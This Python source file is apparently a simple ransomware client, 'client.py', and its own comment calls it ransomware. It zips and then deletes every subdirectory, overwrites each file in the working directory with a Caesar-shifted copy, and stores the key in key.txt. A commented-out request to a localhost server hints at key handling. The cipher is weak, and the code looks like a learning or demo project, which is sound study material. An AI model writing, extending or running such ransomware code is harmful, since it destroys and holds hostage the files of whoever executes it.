import os
# import requests
import shutil
from random import SystemRandom


def caesar_keygen():
    '''
    Generate a Caeser cipher key that is not 0.
    '''
    cryptogen = SystemRandom()
    return cryptogen.randrange(255) + 1


def caesar_encrypt(key, filepath):
    '''
    Use the Caesar cipher to encrypt the file at `filepath` with `key`.
    '''
    ciphertext = []
    with open(filepath, 'rb') as f:
        byte = f.read(1)
        while byte:
            ciphertext.append((ord(byte) + key) % 256)
            byte = f.read(1)
    return bytearray(ciphertext)


def caesar_decrypt(key, filepath):
    '''
    Use the Caesar cipher to decrypt the file at `filepath` with `key`.
    '''
    plaintext = []
    with open(filepath, 'rb') as f:
        byte = f.read(1)
        while byte:
            plaintext.append((ord(byte) - key) % 256)
            byte = f.read(1)
    return bytearray(plaintext)

def encrypt():
    '''
    Run Caesar encryption of all files in this directory.
    '''
    key = caesar_keygen()
    for _, dirs, _ in os.walk(os.getcwd()):
        for d in dirs:  # Zip all directories so they can be encrypted
            shutil.make_archive(d, 'zip', d)
            shutil.rmtree(d)
    for filepath in os.listdir(os.getcwd()):
        if (filepath == 'client.py'):   # Don't let the ransomware self-encrypt
            continue
        ciphertext = caesar_encrypt(key, filepath)
        with open(filepath, 'wb') as f:
            f.write(ciphertext)
    with open('key.txt', 'w') as f:
        f.write(str(key))
    key = None
    del key


def decrypt():
    '''
    Run Caesar decryption of all files in this directory.
    '''
    with open('key.txt', 'r') as k:
        key = int(k.read())
    for filepath in os.listdir(os.getcwd()):
        if (filepath == 'client.py'):
            continue
        plaintext = caesar_decrypt(key, filepath)
        with open(filepath, 'wb') as f:
            f.write(plaintext)


if __name__ == '__main__':
    # r = requests.get('http://localhost:5000/user/baoijsdf')
    encrypt()
    decrypt()
    # print(r.text)
